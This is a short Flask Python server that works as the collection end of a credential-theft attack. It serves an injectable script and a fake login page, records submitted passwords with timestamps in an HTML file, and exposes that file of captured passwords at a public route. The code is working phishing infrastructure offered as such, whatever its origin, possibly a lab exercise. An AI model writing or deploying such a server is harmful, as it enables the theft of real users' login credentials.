import datetime
from flask import Flask, request, render_template

app = Flask(__name__)


@app.route('/')
def hello_world():
    return render_template("test.html")


@app.route("/submit")
def submit():
    pw = request.args.get('tpassword')
    passwordFile = open("templates/passwords.html", "a")
    time = str(datetime.datetime.now())
    if pw:
        passwordFile.write("Password sent at " + time + ": " + pw + "<br> \n")
        return "success"
    else:
        passwordFile.write("Invalid attempt at " + time + "<br> \n")
    passwordFile.close()
    return "not success"


@app.route("/script_to_inject.js")
def get_script():
    return render_template("script_to_inject.js")


@app.route("/fake_login.html")
def get_login_page():
    return render_template("fake_login.html")


@app.route("/passwords.html")
def get_passwords():
    return render_template("passwords.html")
